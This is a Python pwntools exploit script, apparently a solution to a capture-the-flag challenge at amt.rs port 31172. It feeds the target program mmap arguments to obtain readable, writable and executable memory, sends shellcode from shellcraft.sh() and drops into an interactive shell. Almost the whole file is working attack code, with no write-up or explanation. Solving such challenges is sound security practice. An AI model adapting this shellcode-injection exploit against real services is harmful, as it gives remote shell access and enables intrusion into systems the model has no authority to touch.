#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('chal')

host = args.HOST or 'amt.rs'
port = int(args.PORT or 31172)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

context.terminal = ['xfce4-terminal','-e']
gdbscript = '''
b *main+119
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

io.sendlineafter(b'> ',str(0x10000)) # Address
io.sendlineafter(b'> ',str(0x1000)) # Length
"""
#define PROT_EXEC 0x4
#define PROT_WRITE 0x2
#define PROT_READ 0x1
"""
io.sendlineafter(b'> ',str(0Xffffff00)) # fd 
"""
#define MAP_ANONYMOUS 0x20
#define MAP_PRIVATE 0x02
"""
io.sendlineafter(b'> ',str(0x22)) # flags
io.sendlineafter(b'> ',str(0)) # offset
io.sendlineafter(b'> ',str(7)) # protections

io.send(asm(shellcraft.sh()))

io.sendline(b'0')

io.interactive()

